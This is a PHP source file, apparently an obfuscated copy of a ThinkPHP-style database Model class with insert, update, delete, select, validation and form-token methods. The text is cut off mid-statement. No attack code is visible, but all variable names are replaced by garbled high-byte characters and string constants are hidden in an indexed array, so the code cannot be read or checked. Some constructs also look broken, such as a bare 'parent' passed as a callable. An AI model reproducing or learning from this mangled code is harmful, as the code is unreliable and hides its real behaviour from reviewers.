<?php
 goto eí°ĞÈõÁ; d¶‘ìÄ¤: define($_SERVER[¹Éµ„ºå][320], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\x6c\x65", "\x6f\x72\144\x65\162", "\141\154\151\x61\163", "\150\141\x76\151\156\x67", "\147\162\x6f\x75\x70", "\154\157\x63\153", "\x64\151\163\164\151\x6e\x63\x74", "\141\x75\164\157", "\146\x69\154\164\x65\x72", "\x76\x61\x6c\151\x64\141\164\145", "\162\x65\x73\x75\x6c\164", "\142\151\x6e\144", "\164\157\153\x65\156"); public function __construct($½ÂÚÜ–÷ = '', $—ß‹Ó«¥ = '', $µß §¯È = '') { $¬†‰†ê =& $_SERVER[¹Éµ„ºå]; $this->_initialize(); if (!empty($½ÂÚÜ–÷)) { if (strpos($½ÂÚÜ–÷, $¬†‰†ê[10])) { list($this->dbName, $this->name) = explode($¬†‰†ê[10], $½ÂÚÜ–÷); } else { $this->name = $½ÂÚÜ–÷; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($—ß‹Ó«¥)) { $this->tablePrefix = $¬†‰†ê[12]; } elseif ($¬†‰†ê[12] != $—ß‹Ó«¥) { $this->tablePrefix = $—ß‹Ó«¥; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($¬†‰†ê[321]); } $this->db(0, empty($this->connection) ? $µß §¯È : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $³ÔÃİİ„ =& $_SERVER[¹Éµ„ºå]; if (empty($this->fields)) { if (think_config($³ÔÃİİ„[322])) { $ç´©©¨à = $this->dbName ? $this->dbName : think_config($³ÔÃİİ„[323]); $ú…÷¢Ü = think_var_cache($³ÔÃİİ„[324] . strtolower(get_path_this($ç´©©¨à) . $³ÔÃİİ„[10] . $this->name)); if ($ú…÷¢Ü) { $ù§ï‘ìî = think_config($³ÔÃİİ„[325]); if (empty($ù§ï‘ìî) || $ú…÷¢Ü[$³ÔÃİİ„[326]] == $ù§ï‘ìî) { $this->fields = $ú…÷¢Ü; return; } } } $this->flush(); } } public function flush() { $ÔØ‡¿âÌ =& $_SERVER[¹Éµ„ºå]; $this->db->setModel($this->name); $ç¼èëÑê = $this->db->getFields($this->getTableName()); if (!$ç¼èëÑê) { return !1; } $this->fields = array_keys($ç¼èëÑê); $this->fields[$ÔØ‡¿âÌ[327]] = !1; foreach ($ç¼èëÑê as $ìğ“ìÉÊ => $ëÑñ¤§Ş) { $å±íª¢‡[$ìğ“ìÉÊ] = $ëÑñ¤§Ş[$ÔØ‡¿âÌ[33]]; if ($ëÑñ¤§Ş[$ÔØ‡¿âÌ[39]]) { $this->fields[$ÔØ‡¿âÌ[328]] = $ìğ“ìÉÊ; if ($ëÑñ¤§Ş[$ÔØ‡¿âÌ[42]]) { $this->fields[$ÔØ‡¿âÌ[327]] = !0; } } } $this->fields[$ÔØ‡¿âÌ[329]] = $å±íª¢‡; if (think_config($ÔØ‡¿âÌ[325])) { $this->fields[$ÔØ‡¿âÌ[326]] = think_config($ÔØ‡¿âÌ[325]); } if (think_config($ÔØ‡¿âÌ[322])) { $©°ÉâÙò = $this->dbName ? $this->dbName : think_config($ÔØ‡¿âÌ[323]); think_var_cache($ÔØ‡¿âÌ[324] . strtolower(get_path_this($©°ÉâÙò) . $ÔØ‡¿âÌ[10] . $this->name), $this->fields); } } public function switchModel($Šˆ¹Ó‹, $¦ï¯È’Ô = array()) { $ş¼¢”»Œ =& $_SERVER[¹Éµ„ºå]; $¢±ï¬ªÏ = ucwords(strtolower($Šˆ¹Ó‹)) . $ş¼¢”»Œ[330]; if (!class_exists($¢±ï¬ªÏ)) { think_exception($¢±ï¬ªÏ . think_lang($ş¼¢”»Œ[331])); } $this->_extModel = new $¢±ï¬ªÏ($this->name); if (!empty($¦ï¯È’Ô)) { foreach ($¦ï¯È’Ô as $îÛ°åÀ§) { $this->_extModel->setProperty($îÛ°åÀ§, $this->{$îÛ°åÀ§}); } } return $this->_extModel; } public function __set($ÒÂ›¯ˆ·, $Ãéû£àæ) { $this->data[$ÒÂ›¯ˆ·] = $Ãéû£àæ; } public function __get($·“Æ²ı) { return isset($this->data[$·“Æ²ı]) ? $this->data[$·“Æ²ı] : null; } public function __isset($Íì…ÛíÃ) { return isset($this->data[$Íì…ÛíÃ]); } public function __unset($‚ãÑ–Ïû) { unset($this->data[$‚ãÑ–Ïû]); } public function __call($ú®ççÛû, $ÁÆ—ÁÖü) { $î­§¥ =& $_SERVER[¹Éµ„ºå]; if (in_array(strtolower($ú®ççÛû), $this->methods, !0)) { $this->options[strtolower($ú®ççÛû)] = $ÁÆ—ÁÖü[0]; return $this; } elseif (in_array(strtolower($ú®ççÛû), array($î­§¥[332], $î­§¥[333], $î­§¥[334], $î­§¥[335], $î­§¥[336]), !0)) { $¥×®½³ = isset($ÁÆ—ÁÖü[0]) ? $ÁÆ—ÁÖü[0] : $î­§¥[220]; $¥×®½³ = $this->db->parseKey($¥×®½³); return $this->getField(strtoupper($ú®ççÛû) . $î­§¥[337] . $¥×®½³ . $î­§¥[338] . $ú®ççÛû, $î­§¥[332]); } elseif (strtolower(substr($ú®ççÛû, 0, 5)) == $î­§¥[339]) { $¥×®½³ = think_parse_name(substr($ú®ççÛû, 5)); $¬îë¥÷[$¥×®½³] = $ÁÆ—ÁÖü[0]; return $this->where($¬îë¥÷)->find(); } elseif (strtolower(substr($ú®ççÛû, 0, 10)) == $î­§¥[340]) { $§´¦Í•ù = think_parse_name(substr($ú®ççÛû, 10)); $¬îë¥÷[$§´¦Í•ù] = $ÁÆ—ÁÖü[0]; return $this->where($¬îë¥÷)->getField($ÁÆ—ÁÖü[1]); } elseif (isset($this->_scope[$ú®ççÛû])) { return $this->scope($ú®ççÛû, $ÁÆ—ÁÖü[0]); } elseif (method_exists($this, $ú®ççÛû) || method_exists($this, $î­§¥[341] . $ú®ççÛû)) { array_unshift($ÁÆ—ÁÖü, $ú®ççÛû); return call_user_func_array(array($this, $î­§¥[342]), $ÁÆ—ÁÖü); } else { return call_user_func_array(array(parent, $ú®ççÛû), $ÁÆ—ÁÖü); } } protected function call() { $ü—ê›æŒ =& $_SERVER[¹Éµ„ºå]; $½‡Ü“€™ = func_get_args(); $Òùû–æˆ = array_shift($½‡Ü“€™); $—ìÔ©Å– = $Òùû–æˆ; if (is_array($Òùû–æˆ)) { $—ìÔ©Å– = $Òùû–æˆ[1]; $Òùû–æˆ = $Òùû–æˆ[0]; } $ïçİ‰Òä = count($½‡Ü“€™) - 1; if (isset($½‡Ü“€™[$ïçİ‰Òä]) && $½‡Ü“€™[$ïçİ‰Òä] === $Òùû–æˆ) { think_exception(__CLASS__ . $ü—ê›æŒ[4] . $Òùû–æˆ . think_lang($ü—ê›æŒ[343])); return; } $½‡Ü“€™[] = $Òùû–æˆ; if (method_exists($this, $ü—ê›æŒ[344])) { $¾¥€ôï¤ = call_user_func_array(array($this, $ü—ê›æŒ[345]), array($—ìÔ©Å–, $½‡Ü“€™)); if (!is_null($¾¥€ôï¤) && $¾¥€ôï¤ !== !1) { return $¾¥€ôï¤; } } $¸—Æñ¸™ = !1; if (method_exists($this, $Òùû–æˆ)) { $¸—Æñ¸™ = call_user_func_array(array($this, $Òùû–æˆ), $½‡Ü“€™); } if (method_exists($this, $ü—ê›æŒ[346])) { $¾¥€ôï¤ = call_user_func_array(array($this, $ü—ê›æŒ[347]), array($—ìÔ©Å–, $½‡Ü“€™, $¸—Æñ¸™)); if ($¾¥€ôï¤) { return $¾¥€ôï¤; } } return $¸—Æñ¸™; } protected function _initialize() { } protected function _facade($•´®‚ô¢) { $ÃÛ¤â¦Â =& $_SERVER[¹Éµ„ºå]; if (!empty($this->fields)) { foreach ($•´®‚ô¢ as $‘™¹›í => $¹¹Â½Ò) { if (is_array($this->fields) && !in_array($‘™¹›í, $this->fields, !0)) { unset($•´®‚ô¢[$‘™¹›í]); } elseif (is_scalar($¹¹Â½Ò)) { $this->_parseType($•´®‚ô¢, $‘™¹›í); } } } if (!empty($this->options[$ÃÛ¤â¦Â[348]])) { $•´®‚ô¢ = array_map($this->options[$ÃÛ¤â¦Â[348]], $•´®‚ô¢); unset($this->options[$ÃÛ¤â¦Â[348]]); } $this->_beforeWrite($•´®‚ô¢); return $•´®‚ô¢; } protected function _beforeWrite(&$â˜Õ™‘²) { } public function add($½¦çÏ = '', $Âõ–Ñ = array(), $Ğôìòâ¸ = false) { if (empty($½¦çÏ)) { if (!empty($this->data)) { $½¦çÏ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¹Éµ„ºå][349]); return !1; } } $Âõ–Ñ = $this->_parseOptions($Âõ–Ñ); $½¦çÏ = $this->_facade($½¦çÏ); if (!1 === $this->_beforeInsert($½¦çÏ, $Âõ–Ñ)) { return !1; } $ĞÙ¡Ü = $this->db->insert($½¦çÏ, $Âõ–Ñ, $Ğôìòâ¸); if (!1 !== $ĞÙ¡Ü) { $õ×ŒàÔ = $this->getLastInsID(); if ($õ×ŒàÔ) { $½¦çÏ[$this->getPk()] = $õ×ŒàÔ; $this->_after_insert($½¦çÏ, $Âõ–Ñ); return $õ×ŒàÔ; } $this->_after_insert($½¦çÏ, $Âõ–Ñ); } return $ĞÙ¡Ü; } protected function _beforeInsert(&$®Äê¹»ö, $ƒş’íñ™) { } protected function _after_insert($îƒ¶äÈÏ, $¾¸áıÈÃ) { } public function addAll($ûŞ‚‰Ô‡, $ÜÒöú— = array(), $––ªÍ½· = false) { $İ¡Ï¾¥à =& $_SERVER[¹Éµ„ºå]; if (empty($ûŞ‚‰Ô‡)) { $this->error = think_lang($İ¡Ï¾¥à[349]); return !1; } $ÜÒöú— = $this->_parseOptions($ÜÒöú—); foreach ($ûŞ‚‰Ô‡ as $úŞ¾Ã³€ => $ÄÃÎ×Ô†) { $ûŞ‚‰Ô‡[$úŞ¾Ã³€] = $this->_facade($ÄÃÎ×Ô†); } if (method_exists($this->db, $İ¡Ï¾¥à[350])) { $£†‰ßğ¿ = $this->db->insertAll($ûŞ‚‰Ô‡, $ÜÒöú—, $––ªÍ½·); } else { $this->startTrans(); foreach ($ûŞ‚‰Ô‡ as $úŞ¾Ã³€ => $ÄÃÎ×Ô†) { $£†‰ßğ¿ = $this->db->insert($ÄÃÎ×Ô†, $ÜÒöú—, $––ªÍ½·); } $this->commit(); } if (!1 !== $£†‰ßğ¿) { $Ô×¤áÊ = $this->getLastInsID(); if ($Ô×¤áÊ) { return $Ô×¤áÊ; } } return $£†‰ßğ¿; } public function selectAdd($ÚŒ…˜  = '', $À™—²âû = '', $¯æàŒŒ = array()) { $£¶ØÆÃé =& $_SERVER[¹Éµ„ºå]; $¯æàŒŒ = $this->_parseOptions($¯æàŒŒ); if (!1 === ($ƒŠ¶ÄÜ¢ = $this->db->selectInsert($ÚŒ…˜  ? $ÚŒ…˜  : $¯æàŒŒ[$£¶ØÆÃé[351]], $À™—²âû ? $À™—²âû : $this->getTableName(), $¯æàŒŒ))) { $this->error = think_lang($£¶ØÆÃé[352]); return !1; } else { return $ƒŠ¶ÄÜ¢; } } public function save($ìä§ˆÀş = '', $¦¨Ùµ•¦ = array()) { $†ö„×–ç =& $_SERVER[¹Éµ„ºå]; if (empty($ìä§ˆÀş)) { if (!empty($this->data)) { $ìä§ˆÀş = $this->data; $this->data = array(); } else { $this->error = think_lang($†ö„×–ç[349]); return !1; } } $ìä§ˆÀş = $this->_facade($ìä§ˆÀş); $¦¨Ùµ•¦ = $this->_parseOptions($¦¨Ùµ•¦); $ï˜ÅŒ® = $this->getPk(); if (!isset($¦¨Ùµ•¦[$†ö„×–ç[353]])) { if (isset($ìä§ˆÀş[$ï˜ÅŒ®])) { $Ä»‡ê±ú[$ï˜ÅŒ®] = $ìä§ˆÀş[$ï˜ÅŒ®]; $¦¨Ùµ•¦[$†ö„×–ç[353]] = $Ä»‡ê±ú; unset($ìä§ˆÀş[$ï˜ÅŒ®]); } else { $this->error = think_lang($†ö„×–ç[352]); return !1; } } if (is_array($¦¨Ùµ•¦[$†ö„×–ç[353]]) && isset($¦¨Ùµ•¦[$†ö„×–ç[353]][$ï˜ÅŒ®])) { $ôÛ†é€ = $¦¨Ùµ•¦[$†ö„×–ç[353]][$ï˜ÅŒ®]; } if (!1 === $this->_beforeUpdate($ìä§ˆÀş, $¦¨Ùµ•¦)) { return !1; } $ŸçøùİÉ = $this->db->update($ìä§ˆÀş, $¦¨Ùµ•¦); if (!1 !== $ŸçøùİÉ) { if (isset($ôÛ†é€)) { $ìä§ˆÀş[$ï˜ÅŒ®] = $ôÛ†é€; } $this->_afterUpdate($ìä§ˆÀş, $¦¨Ùµ•¦); } return $ŸçøùİÉ; } protected function _beforeUpdate(&$Â­ÈÖÚ, $¯µù†¬À) { } protected function _afterUpdate($¢ÖŠÙ¾À, $¯êåµÖ¸) { } public function delete($Ìá¯È£Ÿ = array()) { $ÓÆÒÉ­³ =& $_SERVER[¹Éµ„ºå]; if (empty($Ìá¯È£Ÿ) && empty($this->options[$ÓÆÒÉ­³[353]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ü°öàÓ = $this->getPk(); if (is_numeric($Ìá¯È£Ÿ) || is_string($Ìá¯È£Ÿ)) { if (strpos($Ìá¯È£Ÿ, $ÓÆÒÉ­³[50])) { $ÅØ»öÖË[$ü°öàÓ] = array($ÓÆÒÉ­³[354], $Ìá¯È£Ÿ); } else { $ÅØ»öÖË[$ü°öàÓ] = $Ìá¯È£Ÿ; } $this->options[$ÓÆÒÉ­³[353]] = $ÅØ»öÖË; } $Ìá¯È£Ÿ = $this->_parseOptions(); if (is_array($Ìá¯È£Ÿ[$ÓÆÒÉ­³[353]]) && isset($Ìá¯È£Ÿ[$ÓÆÒÉ­³[353]][$ü°öàÓ])) { $¾ÙÖçé = $Ìá¯È£Ÿ[$ÓÆÒÉ­³[353]][$ü°öàÓ]; } $ °¡ š÷ = $this->db->delete($Ìá¯È£Ÿ); if (!1 !== $ °¡ š÷) { $òš‹¬¦õ = array(); if (isset($¾ÙÖçé)) { $òš‹¬¦õ[$ü°öàÓ] = $¾ÙÖçé; } $this->_after_delete($òš‹¬¦õ, $Ìá¯È£Ÿ); } return $ °¡ š÷; } protected function _after_delete($ŒÃ‘©Ù, $‡íªÚêÄ) { } public function select($¬ÅŸ‚Ã = array()) { $òìˆ”Ä =& $_SERVER[¹Éµ„ºå]; if (is_string($¬ÅŸ‚Ã) || is_numeric($¬ÅŸ‚Ã)) { $¯Ú–ı³Å = $this->getPk(); if (strpos($¬ÅŸ‚Ã, $òìˆ”Ä[50])) { $ÕÈıˆßÒ[$¯Ú–ı³Å] = array($òìˆ”Ä[354], $¬ÅŸ‚Ã); } else { $ÕÈıˆßÒ[$¯Ú–ı³Å] = $¬ÅŸ‚Ã; } $this->options[$òìˆ”Ä[353]] = $ÕÈıˆßÒ; } elseif (!1 === $¬ÅŸ‚Ã) { $¬ÅŸ‚Ã = $this->_parseOptions(); return $òìˆ”Ä[355] . $this->db->buildSelectSql($¬ÅŸ‚Ã) . $òìˆ”Ä[356]; } $¬ÅŸ‚Ã = $this->_parseOptions(); $…ïÏŞ±Â = $this->db->select($¬ÅŸ‚Ã); if (!1 === $…ïÏŞ±Â) { return !1; } if (empty($…ïÏŞ±Â)) { return null; } $this->_afterSelect($…ïÏŞ±Â, $¬ÅŸ‚Ã); return $…ïÏŞ±Â; } protected function _afterSelect(&$î‘®óïæ, $Èå¨É¿é) { } public function buildSql($Á‡ØÔÔ‡ = array()) { $˜³‰Å²Ÿ =& $_SERVER[¹Éµ„ºå]; $Á‡ØÔÔ‡ = $this->_parseOptions($Á‡ØÔÔ‡); return $˜³‰Å²Ÿ[355] . $this->db->buildSelectSql($Á‡ØÔÔ‡) . $˜³‰Å²Ÿ[356]; } public function optionsValue($ä‰áåÒ = null) { if (is_null($ä‰áåÒ)) { return $this->options; } elseif (is_array($ä‰áåÒ)) { $this->options = array_merge($this->options, $ä‰áåÒ); } } protected function _parseOptions($¸Ä·şåŒ = array()) { $Í€•©­© =& $_SERVER[¹Éµ„ºå]; if (is_array($¸Ä·şåŒ)) { $¸Ä·şåŒ = array_merge($this->options, $¸Ä·şåŒ); } $this->options = array(); if (!isset($¸Ä·şåŒ[$Í€•©­©[357]])) { $¸Ä·şåŒ[$Í€•©­©[357]] = $this->getTableName(); $­»Õ Áä = $this->fields; } else { $­»Õ Áä = $this->getDbFields(); } if (!empty($¸Ä·şåŒ[$Í€•©­©[358]])) { $¸Ä·şåŒ[$Í€•©­©[357]] .= $Í€•©­©[53] . $¸Ä·şåŒ[$Í€•©­©[358]]; } $¸Ä·şåŒ[$Í€•©­©[359]] = $this->name; if (isset($¸Ä·şåŒ[$Í€•©­©[353]]) && is_array($¸Ä·şåŒ[$Í€•©­©[353]]) && !empty($­»Õ Áä) && !isset($¸Ä·şåŒ[$Í€•©­©[360]]) && !isset($¸Ä·şåŒ[$Í€•©­©[357]])) { foreach ($¸Ä·şåŒ[$Í€•©­©[353]] as $Õ¢Èì¼ => $ñ‹ù«š¥) { $Õ¢Èì¼ = trim($Õ¢Èì¼); if (in_array($Õ¢Èì¼, $­»Õ Áä, !0)) { if (is_scalar($ñ‹ù«š¥)) { $this->_parseType($¸Ä·şåŒ[$Í€•©­©[353]], $Õ¢Èì¼); } } elseif (!is_numeric($Õ¢Èì¼) && $Í€•©­©[11] != substr($Õ¢Èì¼, 0, 1) && !1 === strpos($Õ¢Èì¼, $Í€•©­©[10]) && !1 === strpos($Õ¢Èì¼, $Í€•©­©[337]) && !1 === strpos($Õ¢Èì¼, $Í€•©­©[212]) && !1 === strpos($Õ¢Èì¼, $Í€•©­©[284])) { unset($¸Ä·şåŒ[$Í€•©­©[353]][$Õ¢Èì¼]); } } } $this->_options_filter($¸Ä·şåŒ); return $¸Ä·şåŒ; } protected function _options_filter(&$¥ÕÃ…Ø) { } protected function _parseType(&$¬“œÓƒ¼, $ºèÛı¸) { $×ÉÂßæ¶ =& $_SERVER[¹Éµ„ºå]; if (empty($this->options[$×ÉÂßæ¶[361]][$×ÉÂßæ¶[4] . $ºèÛı¸])) { $ˆ²ÇÆÂª = strtolower($this->fields[$×ÉÂßæ¶[329]][$ºèÛı¸]); if (!1 !== strpos($ˆ²ÇÆÂª, $×ÉÂßæ¶[362])) { } elseif (!1 === strpos($ˆ²ÇÆÂª, $×ÉÂßæ¶[363]) && !1 !== strpos($ˆ²ÇÆÂª, $×ÉÂßæ¶[364])) { $¬“œÓƒ¼[$ºèÛı¸] = intval($¬“œÓƒ¼[$ºèÛı¸]); } elseif (!1 !== strpos($ˆ²ÇÆÂª, $×ÉÂßæ¶[365]) || !1 !== strpos($ˆ²ÇÆÂª, $×ÉÂßæ¶[366])) { $¬“œÓƒ¼[$ºèÛı¸] = floatval($¬“œÓƒ¼[$ºèÛı¸]); } elseif (!1 !== strpos($ˆ²ÇÆÂª, $×ÉÂßæ¶[367])) { $¬“œÓƒ¼[$ºèÛı¸] = (bool) $¬“œÓƒ¼[$ºèÛı¸]; } } } public function find($Ü÷›İï = array()) { $°æŠç¤ =& $_SERVER[¹Éµ„ºå]; if (is_numeric($Ü÷›İï) || is_string($Ü÷›İï)) { $âÃ²ò€¦[$this->getPk()] = intval($Ü÷›İï); $this->options[$°æŠç¤[353]] = $âÃ²ò€¦; } $this->options[$°æŠç¤[368]] = 1; $Ü÷›İï = $this->_parseOptions(); $ÈûàÆ¾æ = $this->db->select($Ü÷›İï); if (!1 === $ÈûàÆ¾æ) { return !1; } if (empty($ÈûàÆ¾æ)) { return null; } $Ì„¨±ë = $ÈûàÆ¾æ[0]; $this->_afterFind($Ì„¨±ë, $Ü÷›İï); return $Ì„¨±ë; } protected function _afterFind(&$®Œ» Ğ, $À½ÀßÂ) { } protected function returnResult($šÌ‡º–, $õØòû½Â = '') { $ ø›×îÇ =& $_SERVER[¹Éµ„ºå]; if ($õØòû½Â) { if (is_callable($õØòû½Â)) { return call_user_func($õØòû½Â, $šÌ‡º–); } switch (strtolower($õØòû½Â)) { case $ ø›×îÇ[369]: return json_encode($šÌ‡º–); case $ ø›×îÇ[370]: return xml_encode($šÌ‡º–); } } return $šÌ‡º–; } public function parseFieldsMap($…«Ç«ğŒ, $¿º™À˜‘ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ŠöÈ’üş => $¿ÔêÅŠ†) { if ($¿º™À˜‘ == 1) { if (isset($…«Ç«ğŒ[$¿ÔêÅŠ†])) { $…«Ç«ğŒ[$ŠöÈ’üş] = $…«Ç«ğŒ[$¿ÔêÅŠ†]; unset($…«Ç«ğŒ[$¿ÔêÅŠ†]); } } else { if (isset($…«Ç«ğŒ[$ŠöÈ’üş])) { $…«Ç«ğŒ[$¿ÔêÅŠ†] = $…«Ç«ğŒ[$ŠöÈ’üş]; unset($…«Ç«ğŒ[$ŠöÈ’üş]); } } } } return $…«Ç«ğŒ; } public function setField($ä¸ñøì¥, $‘À¿ñ’· = '') { if (is_array($ä¸ñøì¥)) { $åğ´øŞ = $ä¸ñøì¥; } else { $åğ´øŞ[$ä¸ñøì¥] = $‘À¿ñ’·; } return $this->save($åğ´øŞ); } public function setAdd($ÒÉ›™©Æ, $Ú‘ĞĞ‰ = 1) { $Ôõ÷Ğğæ =& $_SERVER[¹Éµ„ºå]; $å„ëÍÅÎ = $ÒÉ›™©Æ . $Ôõ÷Ğğæ[371] . $Ú‘ĞĞ‰; if ($Ú‘ĞĞ‰ < 0) { $å„ëÍÅÎ = $ÒÉ›™©Æ . $Ú‘ĞĞ‰; } return $this->setField($ÒÉ›™©Æ, array($Ôõ÷Ğğæ[372], $å„ëÍÅÎ)); } public function getField($ÅŞÄ‰”â, $ú–¥Ë­ä = null) { $ä—Áˆ§Ø =& $_SERVER[¹Éµ„ºå]; $ï‰ø»µÈ[$ä—Áˆ§Ø[351]] = $ÅŞÄ‰”â; $ï‰ø»µÈ = $this->_parseOptions($ï‰ø»µÈ); $ÅŞÄ‰”â = trim($ÅŞÄ‰”â); if (strpos($ÅŞÄ‰”â, $ä—Áˆ§Ø[50])) { if (!isset($ï‰ø»µÈ[$ä—Áˆ§Ø[368]])) { $ï‰ø»µÈ[$ä—Áˆ§Ø[368]] = is_numeric($ú–¥Ë­ä) ? $ú–¥Ë­ä : $ä—Áˆ§Ø[12]; } $°¤æ•‚Ê = $this->db->select($ï‰ø»µÈ); if (!empty($°¤æ•‚Ê)) { $¿ŞÑ¾Î• = explode($ä—Áˆ§Ø[50], $ÅŞÄ‰”â); $ÅŞÄ‰”â = array_keys($°¤æ•‚Ê[0]); $úùé´¢‹ = array_shift($ÅŞÄ‰”â); $üáñÇœÛ = array_shift($ÅŞÄ‰”â); $Çè¯úäÅ = array(); $î³³ìù = count($¿ŞÑ¾Î•); foreach ($°¤æ•‚Ê as $¨äÍçî¶) { $•ËğË›Å = $¨äÍçî¶[$úùé´¢‹]; if (2 == $î³³ìù) { $Çè¯úäÅ[$•ËğË›Å] = $¨äÍçî¶[$üáñÇœÛ]; } else { $Çè¯úäÅ[$•ËğË›Å] = is_string($ú–¥Ë­ä) ? implode($ú–¥Ë­ä, $¨äÍçî¶) : $¨äÍçî¶; } } return $Çè¯úäÅ; } } else { if (!0 !== $ú–¥Ë­ä) { $ï‰ø»µÈ[$ä—Áˆ§Ø[368]] = is_numeric($ú–¥Ë­ä) ? $ú–¥Ë­ä : 1; } if ($ú–¥Ë­ä === $ä—Áˆ§Ø[332]) { unset($ï‰ø»µÈ[$ä—Áˆ§Ø[368]]); } $¨äÍçî¶ = $this->db->select($ï‰ø»µÈ); if (!empty($¨äÍçî¶)) { if ($ú–¥Ë­ä === $ä—Áˆ§Ø[332]) { return reset($¨äÍçî¶[0]); } if (!0 !== $ú–¥Ë­ä && 1 == $ï‰ø»µÈ[$ä—Áˆ§Ø[368]]) { return reset($¨äÍçî¶[0]); } foreach ($¨äÍçî¶ as $“ŞÓ•ÏÎ) { $Â¶Å…óÈ[] = $“ŞÓ•ÏÎ[$ÅŞÄ‰”â]; } return $Â¶Å…óÈ; } } return null; } public function create($’”¨ˆ÷é = '', $šÑ–‹ïë = '') { $Ø‚¶¼· =& $_SERVER[¹Éµ„ºå]; if (empty($’”¨ˆ÷é)) { $’”¨ˆ÷é = $_POST; } elseif (is_object($’”¨ˆ÷é)) { $’”¨ˆ÷é = get_object_vars($’”¨ˆ÷é); } if (empty($’”¨ˆ÷é) || !is_array($’”¨ˆ÷é)) { $this->error = think_lang($Ø‚¶¼·[349]); return !1; } $’”¨ˆ÷é = $this->parseFieldsMap($’”¨ˆ÷é, 0); $šÑ–‹ïë = $šÑ–‹ïë ? $šÑ–‹ïë : (!empty($’”¨ˆ÷é[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Ø‚¶¼·[351]])) { $çÁìğ‰ò = $this->options[$Ø‚¶¼·[351]]; unset($this->options[$Ø‚¶¼·[351]]); } elseif ($šÑ–‹ïë == THINK_MODEL_INSERT && isset($this->insertFields)) { $çÁìğ‰ò = $this->insertFields; } elseif ($šÑ–‹ïë == THINK_MODEL_UPDATE && isset($this->updateFields)) { $çÁìğ‰ò = $this->updateFields; } if (isset($çÁìğ‰ò)) { if (is_string($çÁìğ‰ò)) { $çÁìğ‰ò = explode($Ø‚¶¼·[50], $çÁìğ‰ò); } if (think_config($Ø‚¶¼·[373])) { $çÁìğ‰ò[] = think_config($Ø‚¶¼·[374]); } foreach ($’”¨ˆ÷é as $Ï¹½Š‘ë => $ÖÉ˜Œİ) { if (!in_array($Ï¹½Š‘ë, $çÁìğ‰ò)) { unset($’”¨ˆ÷é[$Ï¹½Š‘ë]); } } } if (!$this->autoValidation($’”¨ˆ÷é, $šÑ–‹ïë)) { return !1; } if (!$this->autoCheckToken($’”¨ˆ÷é)) { $this->error = think_lang($Ø‚¶¼·[375]); return !1; } if ($this->autoCheckFields) { $çÁìğ‰ò = $this->getDbFields(); foreach ($’”¨ˆ÷é as $Ï¹½Š‘ë => $ÖÉ˜Œİ) { if (!in_array($Ï¹½Š‘ë, $çÁìğ‰ò)) { unset($’”¨ˆ÷é[$Ï¹½Š‘ë]); } elseif (MAGIC_QUOTES_GPC && is_string($ÖÉ˜Œİ)) { $’”¨ˆ÷é[$Ï¹½Š‘ë] = stripslashes($ÖÉ˜Œİ); } } } $this->autoOperation($’”¨ˆ÷é, $šÑ–‹ïë); $this->data = $’”¨ˆ÷é; return $’”¨ˆ÷é; } public function autoCheckToken($ŠŠëÊÇ¿) { $…¸—êÅĞ =& $_SERVER[¹Éµ„ºå]; if (isset($this->options[$…¸—êÅĞ[376]]) && !$this->options[$…¸—êÅĞ[376]]) { return !0; } if (think_config($…¸—êÅĞ[373])) { $‰“…äı‘ = think_config($…¸—êÅĞ[374]); if (!isset($ŠŠëÊÇ¿[$‰“…äı‘]) || Session::get($‰“…äı‘)) { return !1; } list($ø–£ší, $ì€Í ªµ) = explode($…¸—êÅĞ[11], $ŠŠëÊÇ¿[$‰“…äı‘]); if ($ì€Í ªµ && Session::get($‰“…äı‘ . $…¸—êÅĞ[10] . $ø–£ší) === $ì€Í ªµ) { Session::remove($‰“…äı‘ . $…¸—êÅĞ[10] . $ø–£ší); return !0; } if (think_config($…¸—êÅĞ[377])) { Session::remove($‰“…äı‘ . $…¸—êÅĞ[10] . $ø–£ší); } return !1; } return !0; } public function regex($‡ÉöÇşÇ, $«À³é»·) { $§è¦®À =& $_SERVER[¹Éµ„ºå]; $Èëğ„˜§ = array($§è¦®À[378] => $§è¦®À[379], $§è¦®À[380] => $§è¦®À[381], $§è¦®À[382] => $§è¦®À[383], $§è¦®À[384] => $§è¦®À[385], $§è¦®À[386] => $§è¦®À[387], $§è¦®À[388] => $§è¦®À[389], $§è¦®À[390] => $§è¦®À[391], $§è¦®À[366] => $§è¦®À[392], $§è¦®À[393] => $§è¦®À[394]); if (isset($Èëğ„˜§[strtolower($«À³é»·)])) { $«À³é»· = $Èëğ„˜§[strtolower($«À³é»·)]; } return preg_match($«À³é»·, $‡ÉöÇşÇ) === 1; } private function autoOperation(&$ê·¯É‚Ê, $î²èäÔ) { $Ñ–É€Òú =& $_SERVER[¹Éµ„ºå]; if (!empty($this->options[$Ñ–É€Òú[395]])) { $Èİ¡°´Ó = $this->options[$Ñ–É€Òú[395]]; unset($this->options[$Ñ–É€Òú[395]]); } elseif (!empty($this->_auto)) { $Èİ¡°´Ó = $this->_auto; } if (isset($Èİ¡°´Ó)) { foreach ($Èİ¡°´Ó as $ÁÅ«Úİå) { if (empty($ÁÅ«Úİå[2])) { $ÁÅ«Úİå[2] = THINK_MODEL_INSERT; } if ($î²èäÔ == $ÁÅ«Úİå[2] || $ÁÅ«Úİå[2] == THINK_MODEL_BOTH) { switch (trim($ÁÅ«Úİå[3])) { case $Ñ–É€Òú[396]: case $Ñ–É€Òú[397]: $”Î€Ûğ¾ = isset($ÁÅ«Úİå[4]) ? (array) $ÁÅ«Úİå[4] : array(); if (isset($ê·¯É‚Ê[$ÁÅ«Úİå[0]])) { array_unshift($”Î€Ûğ¾, $ê·¯É‚Ê[$ÁÅ«Úİå[0]]); } if ($Ñ–É€Òú[396] == $ÁÅ«Úİå[3]) { $ê·¯É‚Ê[$ÁÅ«Úİå[0]] = 